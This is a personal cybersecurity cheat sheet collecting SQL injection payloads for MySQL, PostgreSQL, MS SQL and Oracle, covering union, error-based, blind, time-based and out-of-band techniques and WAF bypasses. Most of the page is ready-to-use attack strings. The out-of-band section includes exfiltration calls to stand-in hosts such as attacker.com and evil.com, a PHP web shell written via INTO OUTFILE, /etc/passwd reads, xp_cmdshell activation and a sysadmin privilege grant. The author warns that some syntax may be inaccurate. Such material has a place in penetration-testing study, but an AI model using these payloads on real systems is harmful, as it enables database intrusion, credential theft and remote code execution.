---
layout: page

title: SQLi

category: infosec
see_my_category_in_header: true

permalink: /infosec/sql-injection.html
---

<article class="markdown-body" markdown="1">

***THIS ARTICLE MAY CONTAIN syntax inaccuracy, THIS ARTICLE ALSO MUST BE RECONSIDERED AND REORGANIZED***

I collect different types of sqli attacks from the internet.

In this document I am targeting 4 databases: MySQL, PostgreSQL, MS SQL, ORACLE


# Content

* TOC
{:toc}

---

Additional SQL-injection technics to be studyed:

* ***DIOS*** - Dump In One Shot

    * [DIOS explained part 1](http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
    * [DIOS explained part 2](http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html)
    * [DIOS the SQL Injectors Weapon (Upgraded)](http://www.securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html)
    * [SQLi DIOS](https://forum.antichat.ru/threads/425320/)
    * [DIOS запросы в SQL инъекциях](https://defcon.ru/web-security/2320/)

    * [Ещё статья про SQL injection](https://codeby.net/forum/threads/laboratorija-testirovanija-na-proniknovenie-test-lab-v-10-za-granju-xakerskix-vozmozhnostej-7.58743/)

    <div class="spoiler">
    <div class="spoiler-title">
    <i>Some DIOS examples:</i>
    </div>
    <div class="spoiler-text" markdown="1">
    
    `(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata)where (@a)in (@a:=concat(@a,schema_name,'<br>'))))a)`

    `concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where@:=concat_ws(0x20,@,0x3c6c693e,table_name,column_name)),@)`

    `concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`

    `product_id=50 union select null,null,concat(0x3c2f613e3c2f6c693e3c2f756c3e3c2f6469763e3c6469763e3c666f6e7420636f6c6f723d27677265656e272073697a653d353e5370656369616c20466f7220436f64654279204279204461726b4e6f6465204861636b6572,concat_ws(0x20,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=concat_ws(0x20,@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@),0x3c212d2d) -- -`

    `product_id=50 union select null,null,concat('</a></li></ul></div><div><font color='green' size=5>HTML TAGS CLOSE HEADER',concat_ws(' ",@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!='information_schema')and@:=concat_ws(' ',@,0x3c6c693e,0x3c666f6e7420636f6c6f723d22726564223e5b,table_schema,0x5d,0x3c666f6e7420636f6c6f723d27677265656e273e5b,table_name,0x5d,0x3c666f6e7420636f6c6f723d27626c7565273e5b,column_name,0x5d)),@)`
    
    </div>
    </div>


# SQL-injection Bookmarks

* [SQL cheat sheet](http://www.sql-tutorial.net/SQL-Cheat-Sheet.pdf)
* [SQL tutorial](http://www.sql-tutorial.net/)

<br>

Do not really rely on automatic tools.

* [Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server) - MySQL fake server for read files of connected clients
* [attackercan/cpp-sql-fuzzer](https://github.com/attackercan/CPP-SQL-FUZZER) - tables of allowed symbols in different inputs of SQL expressions
* [sqlmap](http://sqlmap.org/) - tool that automates the process of detecting and exploiting SQL injection ([Automated Audit using sqlmap](https://www.owasp.org/index.php/Automated_Audit_using_SQLMap))

    `sqlmap.py -r burp-request.txt -p InjectedParameter` - example 2

    `sqlmap "--suffix= --.example.com" -u "https://10.0.0.1/upload/files/asdf" "--host=settings_conf " -p host --dbms PostgreSQL --os Linux --level 5 --risk 3 --banner` - example1

* [mieliekoek.pl](https://packetstormsecurity.com/files/25807/mieliekoek.pl.html) - SQL insertion crawler which tests all forms on a web site for possible SQL insertion problems

Cheatsheets:

* [sql Injection Cheat Sheet (pentestmonkey)](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) + Oracle, MSSQL, MySQL, PostgreSQL, Ingres, DB2, Informix
* [sql injection knowledge base](http://websec.ca/kb/sql_injection) - Oracle, MSSQL, MySQL
* {:.dummy} [MySql SQL injection (RDot intro)](https://rdot.org/forum/showthread.php?t=124)

<br>

* [getting around mysql_real_escape_string()](http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string) (2nd answer)
* [MySqli based on multibyte encodings](https://raz0r.name/vulnerabilities/sql-inekcii-svyazannye-s-multibajtovymi-kodirovkami-i-addslashes/) (*русский*)

#### attack databases

* [red database security](http://red-database-security.com/) - group focused on ORACLE database security (presentations, articles, etc.)

* [Advanced MySqli exploitation with FILE_PRIV](http://lab.onsec.ru/2012_03_01_archive.html)
* [ODAT](https://github.com/quentinhardy/odat) - Oracle database attacking tool ([wiki](https://github.com/quentinhardy/odat/wiki))

<br>

---

# Theory

## SQL injection classification

- ***union based sqli***

- ***error based sqli*** - you can see database error output

- ***blind sqli*** - you can see some differences between successfull query and unsuccessfull:

    - any visible in the page source code differences *(different numbers of `br` in document, different news posts depending on querry, etc)*
    - you may have an opportunity to destinguish types of database errors, but not its content, so you can not return data in error

        this is a mutated vector called ***error based blind sqli***

- ***double blind sqli (time-based)*** - there is absolutely no other means to destinguish successfull and unsuccessfull query, but you can use `sleep` or `benchmark` or some hard mathematical computation to make successfull query work significantly longer.

Typical sql-injection workflow:

- detect accessible databases
- found table names
- found amount of columns, names and types of columns
- found contence of tables

SQL injection mitigation:

- Use ***prepared statements***
- [SQL injection Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

This mitigation does work if implemented correctly but it is **NOT** correct mitigation:

- typecast expected integer values
- escape expected strings with mysql_real_escape_string and embed them with quotes

<br>

Any differences in databases syntax or semantics help defining database type.

<br><br>

---

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->

## Databases capabilities

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->

### Databases characteristics

<table>
<colgroup>
    <col style="width: 20%"/>
    <col style="width: 20%"/>
    <col style="width: 20%"/>
    <col style="width: 20%"/>
    <col style="width: 20%"/>
</colgroup>
<thead>
    <tr>
        <th markdown="1">*Feature*</th>
        <th markdown="1">[MySQL](dev.mysql.com/doc/refman/5.7/en/string-functions.html)</th>
        <th markdown="1">[PostgreSQL](https://www.postgresql.org/docs/manuals/)</th>
        <th markdown="1">MS SQL</th>
        <th markdown="1">ORACLE</th>
    </tr>
</thead>

<tbody>
<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">
Comments
</td>
<td markdown="1">
`#...` `-- ...` `/*...*/` `;\x00...` `/*!50713 or 1=1*/` - comment if mysql version < 5.7.13
</td>
<td markdown="1">
</td>
<td markdown="1">
`/*...*/` `-- ...` `;\x00...`
</td>
<td markdown="1">
`--`
</td>
</tr> <!-- ======================================================================================================================================== -->

<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">Separation of DB queries (`;`)
</td>
<td markdown="1">no
</td>
<td markdown="1">yes
</td>
<td markdown="1">yes
</td>
<td markdown="1">yes
</td>
</tr> <!-- ======================================================================================================================================== -->

<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">`information_schema` etc.
</td>
<td markdown="1">mysql version >= 5
</td>
<td markdown="1">
</td>
<td markdown="1"> \>= 2000
</td>
<td markdown="1">
no `information_schema`

special table: `dual`
</td>
</tr> <!-- ======================================================================================================================================== -->

<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">time
</td>
<td markdown="1">now()
</td>
<td markdown="1">
</td>
<td markdown="1">getdate()
</td>
<td markdown="1">sysdate()
</td>
</tr> <!-- ======================================================================================================================================== -->

<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">
Query example
</td>
<td markdown="1">
`SELECT * FROM information_schema.schemata where 1=1;`
</td>
<td markdown="1">

</td>
<td markdown="1">

</td>
<td markdown="1">
`SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM DUAL;`
</td>
</tr> <!-- ======================================================================================================================================== -->


<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">
Error example
</td>
<td markdown="1">
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near …
</td>
<td markdown="1">
Query failed: ERROR: syntax error at or near “'” at character 56 in /www/site/ test.php on line 121.
</td>
<td markdown="1">
Microsoft SQL Native Client error ‘80040e14’

Unclosed quotation mark after the character string
</td>
<td markdown="1">
ORA-00933: SQL command not properly ended
</td>
</tr> <!-- ======================================================================================================================================== -->

<tr> <!-- ======================================================================================================================================== -->
<td markdown="1">
Handy functions
</td>
<td markdown="1">
`SUBSTRING (str, pos[, len])`
`CONCAT (param1, param2, ...)`
`IF (exp,true,false)`

[String functions](http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#operator_sounds-like)

[Miscellaneous functions](http://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html)
</td>
<td markdown="1">
    
</td>
<td markdown="1">
`if 1=1 select... else select ...;` - *`if` cann't be used inside `select`*

`case ... [when ... then ...]* else ... end`
</td>
<td markdown="1">

</td>
</tr> <!-- ======================================================================================================================================== -->

</tbody>
</table>

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->

### Database operands

*Mainly from MySQL*

- `and`, `or`, `not`, `!` `or not`, `and not`, `div`, `xor`, `or`, `and`
- `+`, `-`, `=`, `&`, `|`, `&&`, `||`, `<=>`, `<=`, `>=`, `!=`, `<>`, `^`, `*`, `<<`, `>>`, `<>`, `%`, `/`, `<`, `>`, `~`


### Databases features

#### MySQL

1. `group by x` in MySQL will group results by x, even if final table will have other column y and some rows with identical x will have different y. MySQL will just select some random row for the final table. To the contrary, any other databases will not do so, they will throw error in such uncertain cituation.<br>&#20;


1. MySQL @@version < 3
    
    - no subqueries `select (select ...)`
    - no `union`


1. Reading files from mysql ***client*** (mysql protocol)

    `LOAD DATA LOCAL INFILE '/etc/passwd'` (e.g. [mysql server for file reading](https://github.com/allyshka/Rogue-MySql-Server))

1. MySQL variables

    <br>

    @@basedir, @@datadir, @@tmpdir

    @@version, @@version_compile_os, @@version_comment, @@version_compile_machine

    @@database

    @@log_error

    USER(), SYSTEM_USER(), SESSION_USER(), CURRENT_USER()

    etc. (> 500)


1. Back quotes means database and table.

    ```select * from `information_schema`.`shemata`;```

<!--

#### PostgreSQL

-->

#### MS SQL

1. Adding **`sp_password`** to commentary will lead to not logging query to log file.

    `select * from users where id='1' AND 1=1 -- sp_password`

1. In ASP `%` is fully removed
    
    `S%E%L%E%C%T%01column%02FROM%03table;`

2. Stacked queries support

    `...' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');`

1. Symbols from range 0x01 to 0x20 are all space equivalent.

1. MSSQL enables to connect to databases inside query:

    `?id=1; select * from OPENRAWSET('SQLOLEDB', '';'user_id';'passwd','waitfor delay "0:0:50"; select 1;');` - just a delay <br>
    `?id=1; select*from OPENRAWSET('SQLOLEDB','';'user_id';'passwd','exec master..sp_addsrvrolemember "passwd","sysadmin"; select 1');` - add current user to admin group

#### ORACLE

1. Table and database names can be encoded
2. No automatic type casting, use `upper()`
3. No `limit`, no `offset`, use

    `select id from (select id, rownum rnum from users a) where rnum=13;`

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->

<br><br>

---

## SQL injection technics

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->

### Union SQL injection

Use `UNION ALL` - to be free from DISTINCT
Use `NULL` - because usually you have no idea about types

#### MySQL

- Typical attack vector:

    - `?id=1' limit 0 union select group_concat(schema_name) from information_schema.schemata -- -`


- Concatenation column values into one cell

    - **`GROUP_CONCAT`** *(limit = 1024 symbols)*
    
        `select GROUP_CONCAT (concat_ws(0x3a,login,password)) from users;`

    - **`BENCHMARK`** as a cycle

        <pre>
select concat( concat(
    @i:=(select min(id) from users),
    @s:='',
    BENCHMARK(
        10,
        @s:=concat(
            @s,
            (select concat_ws(':',login, password) from users where id=@i limit 0,1),
            '|',
            i:=(select min(id) from users where id>@i)
        ))), @s);</pre>

    - ***variable*** after **`WHERE`**

        `select concat(@p:=0x20,(select count(*) from users where @p:=concat(@p,password,0x2C)), @p);`


- bypass construction `str `**`LIKE`**` '$usr_input'`
    
    - `%` - means any string
    - `_` - means any symbol


- injection after **`GROUP BY`** *(you can not use union)*

    - `select * from users where id=1 GROUP BY id limit 1 `**`PROCEDURE ANALYZE()`**`;`
    - `select * from users where id=1 GROUP BY `**`CASE`**` @@version like '5.7' `**`WHEN`**` 1 `**`THEN`**` post_id `**`ELSE`**` post_author `**`END`**


- `UNION ALL` can be used against `DISTINCT`


- getting executing query

    - `SELECT info FROM information_schema.`**`processlist`**`;`


#### PostgreSQL

- Query example:

    /?param=`1 and (1) = cast (version() as numeric)--` <br>
    /?param=`1 and (1) = cast (version() as int)--`

#### MS SQL

- Query example:

    - create temp table and insert data

        `AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name > @xy SELECT @xy AS xy INTO tmp_db END;`

    - dump content

        `AND 1 = (SELECT TOP 1 SUBSTRING (xy, 1, 353) FROM tmp_db);`

    - dumping multiple tables and columns at once

        `SELECT table_name, ', ' FROM information_schema.tables FOR XML PATH('');` *SQL server 2005+*

    - dump content from information_schema

        `AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)`


- <div><pre>UNION SELECT name FROM master..sysobjects WHERE xtype='U';
'V' - for views 'U' - for user defined </pre></div>

#### ORACLE

- Query example

    - Getting version

        /?param=`1 and (1) = (select upper (XMLType (chr(60)||chr(58)||chr(58)||(select replace (banner, chr(32), chr(58)) from sys.v_$version where rownum =1)||chr(62))) from dual) --`

    - Getting multiple tables at once

        `SELECT RTRIM (XMLAGG (XMLELEMENT (e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables;`


<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<br><br>

---

### Error-based SQL injection

#### MySQL

Overal restriction for error length <= 512 *(mysys/my_error.c)*

- Counting amount of columns

    - `select * from users group by 5;`
    - `select * from users order by 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15;`

        Error: **`Unknown column`**` '4' in 'order clause'`

    - `select * from users where (SELECT * from users)=(1,2);`
    
        Error: `Operand should `**`contain 5 column(s)`**


- Reading column names

    - `select * from users where (1,2,3) = (select * from users UNION select 1%0,2,3);`

        Error: `Column 'id' `**`cannot be null`**

    - `insert into users (id,username,passwd) values (if(1=1,NULL,'1'), '2','3')`

        Error: `Column 'id' `**`cannot be null`**

        Values types can be guessed by changing the insertion values

    - **JOIN** Duplicate column name *(select can not work after `join` combined two tables into one with duplicate column names)*

        - `select * from (select * from users `**`JOIN`**` users a)b;`
    
            `select * from (select * from users `**`JOIN`**` users a using (id))x;` - *will skip already known column id*

            Error: **`Duplicate column name`**` 'id'`

        - Same but without `join` keyword

            `select * from (select * from users, users as a)b;`


- Reading values

    - Error based on **`COUNT(*)`**, **`FLOOR(RAND(0)*2)`** and **`GROUP BY`** *(Works because mysql insides executes this query by making two queries:  add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table)*

        `select COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2) )x from users GROUP BY x;`

        *Does not work with `group_concat` instead of `version`*

    - Convertion errors:

        ``

    - `BIGINT UNSIGNED` error. *error length <= 452*

        *(math functions: HEX, IN, FLOOR, CEIL, RAND, CEILING, TRUNCATE, TAN, SQRT, ROUND, SIGN)*

        <br>

        e.g. `select !(select * from (select version())x) - ~0;` - `~` is bit negation, `!` makes typecast from string to number

        <br>

        `select 2 * if((select * from users limit 1) > (select * from users limit 1), 18446744073709551610, 18446744073709551610);`<br>
        Error: `... 'security'.'users'.'username' ...` - *we got full names of db, table and column_names*

        <br>

        `!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x) - ~0` - will dump information_schema **values** in mysql version() == 5.5.5


- Handy functions:

    - **`NAME_CONST`** - makes data the name of column *(extends our technic field)*, but argument should be constant *(constrict the field)*

        `select name_const(version(), 1);`


- Functions that expose its values when got wrong parameters:

    - updatexml

        `select updatexml(1, concat('~', version()), 1);`

    - extractvalue

        `select extractvalue(1, concat('~', version()));`

    - ST_LongFromGeoHash - *mysql >= 5.7.5*

        `select ST_LongFromGeoHash(version());`

    - JSON_\* - *mysql =?= ?.?.?*

#### PostgreSQL

- incorrect data type casting

    `select cast(version() as numeric);`


#### MS SQL

- Reading column names

    - `group by x` will fail if table has column y and pair (x1, y1) != (x2, y2)

        Error: **`Column`**` 'Users.password' `**`is invalid`**` ... it is not contained in either an aggregate function or the GROUP BY clause.`


- Reading values

    - typecast error

        `select convert(int, @@version);`

        `?id=1 or 1=convert(int, (USER))--`


- Some queries:

    `SELECT * FROM dbo.news WHERE id=1 and PERMISSIONS((select login + char(58) + pass as l from users for xml raw)) is not null;` <br>
    `SELECT * FROM dbo.news WHERE id=1 and SUSER_NAME((select login + char(58) + pass as l from users for xml raw)) is not null;` <br>
    `SELECT * FROM dbo.news WHERE id=1 and USER_NAME((select login + char(58) + pass as l from users for xml raw)) is not null;`

#### ORACLE

- Reading values

    - reading value through **XML ERRORS** (*space or symbol `@` will cut off value output in error msg*)

        `select XMLType ((select 'abcdef' from dual)) from dual;`

        Error: `... expected '<' instead of 'a' ...`

        <br>

        `select XMLType((select '<abcdef:root>' from dual)) from dual;`

        Error: `... namespace prefix "abcdef" is not declared ...`

        <br>

        `select XMLType((select '<:abcdef>' from dual)) from dual;`

        Error: `... Warning: invalid QName ":abcdef" (not a Name) ...`


    - **XML ERROR** *will return 107 symbols of database content*
        <pre>select * from table where id = 1 and (1) =
(select UPPER (XMLTYPE (
    chr(60) || chr(58) || chr(58)|| (
            select RAWTOHEX (login || chr(58) || chr(58) || password) from (
                select login, password, rownum rnum from users a)
            where rnum=2) ||
    chr(62)))
from dual);</pre>


- Some queries:
    
    `select * from products where id_product=10 || UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) ) -- `

    Error: `ORA-292257: host SCOTT unknown`


<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<br><br>

---

### Blind SQL injection

#### MySQL
    
- Everything is based on usage of `if`, `substring`, `ascii`, `char` and _**binary search**_

- **`ORDER BY`** injection

    `select * from news ORDER BY ( id * if (ascii (substring (version(),0,1) ) = 53, 1, -1));`


- **`FIND_IN_SET`** to get more info from each query

    news.php?id=`FIND_IN_SET (substring ((select password from users limit 0,1), 1, 1), '0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f')`

<div class="spoiler"><div class="spoiler-title">
    <i>Error-based blind sql-injection. (11 + 1 error types):</i>
</div><div class="spoiler-text" markdown="1">

>  <br>This query returns 11 different types of errors or no error depending on the first letter from pass.
> 
    sql.php?id=1 AND "x" 
    regexp concat("x{1,25", (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5,6,7,8,9,a'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5,6,7,8,9'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5,6,7,8'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5,6,7'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5,6'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1'),
    (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f'),
    ('}'),
    (select 1 union select 2))),
    '}x{1,0}')),
    '}x{1,(')),
    '}[[:]]')),
    '}[[')),
    '}(({1}')),
    '}|')),
    '}(')),
    '}[2-1]')),
    '}[[.ch.]]')),
    '}\\'))) -- 1
> <div class="spoiler"><div class="spoiler-title">
> 11 + 1 types of mysql errors:
> </div><div class="spoiler-text" markdown="1">
>
> > <br>
> >
| 0  | `select 1;`                                   | No error                                                            |
| 1  | `select if(1=1,(select 1 union select 2),2);` | #1242 - Subquery returns more than 1 row                            |
| 2  | `select 1 regexp if(1=1,"x{1,0}",2);`         | #1139 - Got error 'invalid repetition count(s)' from regexp         |
| 3  | `select 1 regexp if(1=1,"x{1,(",2);`          | #1139 - Got error 'braces not balanced' from regexp                 |
| 4  | `select 1 regexp if(1=1,'[[:]]',2);`          | #1139 - Got error 'invalid character class' from regexp             |
| 5  | `select 1 regexp if(1=1,'[[',2);`             | #1139 - Got error 'brackets ([ ]) not balanced' from regexp         |
| 6  | `select 1 regexp if(1=1,'(({1}',2);`          | #1139 - Got error 'repetition-operator operand invalid' from regexp |
| 7  | `select 1 regexp if(1=1,'',2);`               | #1139 - Got error 'empty (sub)expression' from regexp               |
| 8  | `select 1 regexp if(1=1,'(',2);`              | #1139 - Got error 'parentheses not balanced' from regexp            |
| 9  | `select 1 regexp if(1=1,'[2-1]',2);`          | #1139 - Got error 'invalid character range' from regexp             |
| 10 | `select 1 regexp if(1=1,'[[.ch.]]',2);`       | #1139 - Got error 'invalid collating element' from regexp           |
| 11 | `select 1 regexp if(1=1,'\\',2);`             | #1139 - Got error 'trailing backslash (\)' from regexp              |
> </div></div>
</div>
</div>

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<br><br>

---

### Time-delay (double-blind) SQL injection 

sleep or analogue, or heavy queries or analogue

#### MySQL

- `select if(version() like '5%', `**`sleep`**`(10), false);`
- `select `**`benchmark`**` (10000000, md5(now()));`

#### PostgreSQL

- **`pg_sleep`**`()`

#### MS SQL

- `?id=1; IF (LEN(USER)=5) WAITFOR DELAY '00:00:10'--`

    - **`waitfor delay`**` 'time_to_pass';`
    - **`waitfor time`**` 'time_to_execute';`

#### ORACLE

- `select utl_inaddr.get_host_address('non-exist.com') from dual;`

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<br><br>

---

### Out-of-band SQL injection

#### MySQL

- **file read/write**. *Config must have `FILE_PRIV=yes`*

    - Check if we have file privileges

        `select if (LOAD_FILE ('/etc/passwd') is not NULL, 1, 0)`

        `?id=coalesce (length (load_file (0x2F6574632F706173737764)), 1)` - *coalesce returns first not null value from list*


    - **`LOAD_FILE`**

        `select LOAD_FILE ('/etc/passwd');`


    - **`INTO OUTFILE`**

        `select * from table INTO OUTFILE '/path/to/shell.php' LINES TERMINATED BY "<?php system($_GET[k]);die();?>";`

        `select * from table INTO OUTFILE '/path/to/shell.php' FIELDS TERMINATED BY '' optionally enclosed by "<?php system($_GET[k]);die();?>"`

    
    - **`LOAD DATA INFILE`**

        `LOAD DATA INFILE '/etc/passwd' into table db.users;`


    - **`LOAD DATA LOCAL INFILE`** - according to mysql protocol load file from the client machine


- **internet connections**. *Config must have `FILE_PRIV=yes`*

    - **DNS request**

        `LOAD_FILE (concat ('http://begin.', (select mid (version(), 1, 1)), '.attacker.com/'));`

    - **SMB protocol, etc.**

        `INTO OUTFILE '//evil.com/SMBshare/dump.txt'`

    - **XXE** - `updatexml` and `extractvalue`

        `select UPDATEXML('<!DOCTYPE hifi [<!ENTITY xxe SYSTEM "http://localhost:1234">]><a>&xxe;</a>', '/a', 2);` - *didn't managed to successfully execute this one*
        
        `select EXTRACTVALUE('<!DOCTYPE hifi [<!ENTITY % xxe SYSTEM "http://localhost:1234"> %xxe;]><a>lol</a>', '/a');` - *didn't managed to successfully execute this one*

#### PostgreSQL

- Handy functions

    - **XXE** - `xmlparse`

        <pre>select xmlparse(document '
    &lt;?xml version="1.0" standalone="yes"?&gt;
        <!DOCTYPE content [
            <!ENTITY abc SYSTEM "/etc/network/if-up.d/mountnfs">
        ]>
&lt;content>&abc;&lt;/content>');</pre>

#### MS SQL

- **internet connections**

    - **`OPENRAWSET`**

        `select * from OPENROWSET('SQLOLEDB', 'Network=DBMSSOCN; Address=evil.com; uid=my_username; pwd=mypassword', 'select user_password from users);`


- **RCE** - *`exec` and stored procedure `xp_cmdshell` - must be activated*

    - `EXEC master.dbo.XP_CMDSHELL 'pwd';`

    - **xp_cmdshell activation**:

        <pre>EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'xp_cmdshell', 1;
EXEC sp_configure reconfigure;</pre>

    - **without xp_cmdshell** - creation of your own stored procedure:

        <pre>EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'OLE Automation Procedures', 1;
EXEC sp_configure reconfigure;
\
DECLARE @execmd INT;
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>


#### ORACLE

- **internet connections**

    - **`UTL_HTTP.REQUEST`**
        `select * from users where id=10 || UTL_HTTP.REQUEST ('evil.com' || (select user from dual)) --`

    - **`UTL_INADDR.GET_HOST_ADDRESS`**
        `select UTL_INADDR.GET_HOST_ADDRESS('evil.com') from dual;`


- Handy functions:

    - **XXE** - `xmltype`

        <pre>select extractvalue(xmltype('
    &lt;?xml version="1.0" encoding="UTF-8"?&gt;
    <!DOCTYPE root [
            <!ENTITY % remote SYSTEM "ftp://'||user||':bar@evil.com/test">
            %remote;
        ]>
'),'/l') from dual;`</pre>

<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<br><br>

---

## WAF bypass

[WAF Attack Methods](./hidden/waf.html#attack-methods)

[Encoding special characters](/infolists/encodings.html#special-characters)

[OWASP SQL injection bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)

- Bypassing space

    - add brackets

        `select(username)from[users];`

    - useless operations based on `like`, `substring`, ..., `~`, `!`, unary `+`, `-`, `@`

- Declare some variables, which will break WAF regexps


#### My SQL:

- **hex** encoding `'/etc/passwd' -> 0x2F6574632F706173737764`

- `union select` --> `uNioN SeLeCt`

- `union select` --> `union all select`

- `and` --> if (a, if (b, true, 0), 0)

- comments `/*! select ... */`<br>&#20;

- change syntax and sql query structure. **Synonyms**!

    `substring (str, pos[, len])` vs `substring (str FROM pos [FOR len])` vs `mid (str, pos[, len])` vs `mid (str FROM pos [FOR len])` vs `left` vs `right`

    `convert (version (), binary)` vs  `convert (version () using latin1)` vs `cast (version () as binary)`

    `ascii`, `char`, `hex`

    `regexp`, `rlike`, `not regexp`, `not like` vs `locate (substr, str[, pos])` - *find*

    `if (exp, true, false)`, `ifnull`, `nullif`, `case ... [when ... then ...]* else ... end`, `expr BETWEEN min AND max` - *return 0 or 1*

    `concat (param1, param2, ...)`, `concat_ws (sep, param1, param2, ...)` - *with separator*


- **Examples**

    `/?id=1/*union*/union/*select*/select+1,2,3/*`

    `/?id=1+un/**/ion+sel/**/ect+1,2,3--`

    `/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users`

    <br>

    `Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit".$_GET['c']);`

    `/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--`

    <br>

    no spaces, slashes, quotes and numeric operations:

    `?id=(1)and(1)=(0)union(select(null),group_concat(column_name),(null)from(information_schema.columns)where(table_name)=(0x7573657273))#`

    <br>

    `where` alternative

    `?id=(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like('test')&&(table_name)!=('my_table_1')))#`

    <br>

    bypassing commas:

    `select * from (select 1)x join (select 2)y join (select 3)z;`


#### MS SQL:

- **hex** encoding, etc. **no quotes**

    `DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);`

    `SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110);`

- Symbols %01-%20, `!`, `+`, `-`, `.`, `\`, `~` are alowed as intermediary characters
    
    `SELECT FROM[table]WHERE\1=\1AND\1=\1;`

#### Oracle:

- names can be encoded

    `SELECT 0x09120911091 FROM dual;`
    
    `SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;`


<br><br>

---

<div class="spoiler"><div class="spoiler-title">
    <i>WAF shit I have witnessed:</i>
</div><div class="spoiler-text" markdown="1">

<br>

1. amount of spaces - matters

    `$str = str_replace(array(' '), array('.'), $_GET['param'];);` <br>
    `$res = mysqli_query($db_link, "SELECT * FROM flag WHERE id=".$str."");`

    <br>
    Now if you pass `/?param=1+` - you will be OK. (query = `id=1.`) <br>
    But if you pass `/?param=1++` - everything will go wrong, because query will be `id=1..` - mysql error.

</div>
</div>


